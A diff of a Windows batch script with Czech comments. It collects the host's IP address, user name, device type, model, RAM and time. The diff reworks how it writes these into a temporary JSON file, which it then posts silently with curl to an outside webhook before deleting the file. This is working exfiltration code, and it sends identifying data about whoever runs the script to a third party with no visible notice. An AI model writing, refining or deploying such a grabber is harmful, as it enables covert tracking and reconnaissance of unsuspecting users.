@@ -45,20 +45,21 @@ for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get model') do (
 for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get totalphysicalmemory') do set "ramRaw=%%i"
 set /a ram=%ramRaw:~0,-6%
 
-:: 🧾 Zpráva – každý řádek zvlášť, žádné ^ v textu
-set "msg=🛰️ Systémové info:
+:: 🧾 Zpráva do JSON souboru (každý řádek zvlášť, žádné ^)
+set "payload=%TEMP%\payload.json"
+(
+echo {
+echo   "content": "🛰️ Systémové info:
 IP: ||!ip! ||
 Čas: !timestamp!
 Uživatel: !user!
 Zařízení: !deviceType!
 Model: !deviceModel!
 RAM: !ram! GB"
+echo }
+) > "!payload!"
 
 :: 📤 Odeslání na webhook
-set "payload=%TEMP%\payload.json"
-echo { > "!payload!"
-echo   "content": "!msg!" >> "!payload!"
-echo } >> "!payload!"
 curl -s -X POST %webhook% -H "Content-Type: application/json" --data "@!payload!" >nul
 del /f /q "!payload!"
 
